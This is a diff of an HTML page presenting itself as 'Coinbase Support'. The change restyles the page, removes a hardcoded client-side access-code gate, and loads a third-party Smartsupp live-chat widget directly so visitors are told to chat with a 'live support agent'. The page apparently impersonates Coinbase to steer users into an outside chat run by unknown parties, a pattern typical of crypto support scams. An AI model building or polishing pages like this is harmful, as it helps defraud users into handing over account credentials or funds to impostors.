@@ -7,16 +7,11 @@
 <style>
     body {
         font-family: Arial, sans-serif;
-        background: linear-gradient(135deg, #0052ff, #00aaff);
+        background-color: white;
         margin: 0;
         padding: 0;
-        color: white;
+        color: #333;
         text-align: center;
-        animation: fadeIn 1s ease-in;
-    }
-    @keyframes fadeIn {
-        from { opacity: 0; }
-        to { opacity: 1; }
     }
     .logo img {
         width: 180px;
@@ -26,17 +21,19 @@
         font-size: 2rem;
         font-weight: bold;
         margin: 10px 0;
+        color: #0052ff;
     }
     p.subtitle {
         font-size: 1.1rem;
         opacity: 0.9;
     }
     .banner {
-        background: rgba(255, 255, 255, 0.1);
+        background: #f5f7fa;
         padding: 15px;
         margin: 20px auto;
         width: 90%;
         border-radius: 8px;
+        border: 1px solid #e0e0e0;
     }
     .trust {
         display: flex;
@@ -46,48 +43,20 @@
         flex-wrap: wrap;
     }
     .trust div {
-        background: rgba(255, 255, 255, 0.1);
+        background: #f5f7fa;
         padding: 10px 15px;
         border-radius: 8px;
         font-size: 0.9rem;
-    }
-    #accessForm {
-        margin-top: 25px;
-    }
-    input[type="password"] {
-        padding: 8px;
-        border: none;
-        border-radius: 5px;
-        width: 220px;
-        font-size: 1rem;
-    }
-    button {
-        background-color: #0077ff;
-        color: white;
-        padding: 8px 15px;
-        border: none;
-        border-radius: 5px;
-        margin-left: 10px;
-        font-size: 1rem;
-        cursor: pointer;
-        box-shadow: 0 0 10px rgba(0, 119, 255, 0.7);
-        transition: 0.3s;
-    }
-    button:hover {
-        background-color: #0052cc;
-        box-shadow: 0 0 15px rgba(0, 119, 255, 1);
-    }
-    #chat {
-        display: none;
-        margin-top: 20px;
+        border: 1px solid #e0e0e0;
     }
     footer {
         margin-top: 40px;
         font-size: 0.9rem;
         opacity: 0.8;
+        padding-bottom: 20px;
     }
     footer a {
-        color: white;
+        color: #0052ff;
         text-decoration: none;
         margin: 0 5px;
     }
@@ -104,7 +73,7 @@
 
 <div class="banner">
     Welcome to Coinbase Support. Our team is here to assist you with account issues, transaction inquiries, and security concerns.  
-    Please verify your access code to begin chatting with a live support agent.
+    Please use the chat icon in the corner to connect with a live support agent instantly.
 </div>
 
 <div class="trust">
@@ -113,41 +82,21 @@
     <div>⚡ Fast Response</div>
 </div>
 
-<div id="accessForm">
-    <input type="password" id="code" placeholder="Enter Access Code">
-    <button onclick="checkCode()">Start Chat</button>
-</div>
-
-<div id="chat"></div>
-
 <footer>
     <a href="https://www.coinbase.com/legal/privacy" target="_blank">Privacy Policy</a> | 
     <a href="https://www.coinbase.com/legal/user_agreement" target="_blank">Terms of Service</a>
 </footer>
 
-<script>
-const accessCode = "SUPPORT2025";
-
-function checkCode() {
-    const enteredCode = document.getElementById("code").value;
-    if (enteredCode === accessCode) {
-        document.getElementById("accessForm").style.display = "none";
-        document.getElementById("chat").style.display = "block";
-
-        // Dynamically load Smartsupp after code verification
-        var smartsupp = window.smartsupp || function(){ (smartsupp._ = smartsupp._ || []).push(arguments) };
-        smartsupp.key = '5f52518f4980d6c406ac0ea87b460b3ff9aa3f45';
-        var s = document.createElement('script');
-        s.type = 'text/javascript';
-        s.charset = 'utf-8';
-        s.async = true;
-        s.src = 'https://www.smartsuppchat.com/loader.js?';
-        document.body.appendChild(s);
-
-    } else {
-        alert("Incorrect code. Please try again.");
-    }
-}
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '5f52518f4980d6c406ac0ea87b460b3ff9aa3f45';
+window.smartsupp||(function(d) {
+    var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+    s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+    c.type='text/javascript';c.charset='utf-8';c.async=true;
+    c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
 </script>
 
 </body>
